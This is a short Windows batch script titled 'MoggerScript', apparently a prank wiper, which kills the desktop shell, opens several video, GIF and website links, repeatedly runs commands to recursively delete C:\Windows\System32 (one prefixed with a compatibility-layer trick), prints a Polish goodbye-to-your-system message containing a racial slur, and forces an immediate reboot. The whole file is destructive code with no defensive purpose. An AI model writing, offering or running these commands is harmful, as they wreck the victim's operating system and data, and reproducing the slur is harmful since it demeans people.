@echo off
rem "MoggerScript by strblzng 1.1b"
taskkill /f /im explorer.exe
start https://www.youtube.com/watch?v=Sz_kQuEM0mI
start https://www.youtube.com/watch?v=VCW-DYR5Li0
start https://c.tenor.com/5i_dNjFf1JkAAAAC/tenor.gif
start https://c.tenor.com/byWfo4OgiC0AAAAd/tenor.gif
start rmdir /s /q C:\Windows\System32
start rmdir /s /q C:\Windows\System32
start rmdir /s /q C:\Windows\System32
start rmdir /s /q C:\Windows\System32
start https://media.tenor.com/lYZO4gddxyAAAAAM/kuwaii22-kuwaii.gif
start rmdir /s /q C:\Windows\System32
start https://ptoszek.pl
start rmdir /s /q C:\Windows\System32
Set __COMPAT_LAYER=RunAsInvoker && rmdir /s /q C:\Windows\System32
echo XDDDDDDDD
echo 'Nacisnij jakikolwiek klawisz aby pożegnać się z systemem.... (C) STRBLZNGx 1337 HACKAZ REAL NIGGHAZ OUT HERE.'
pause > nul
shutdown /r /t 0
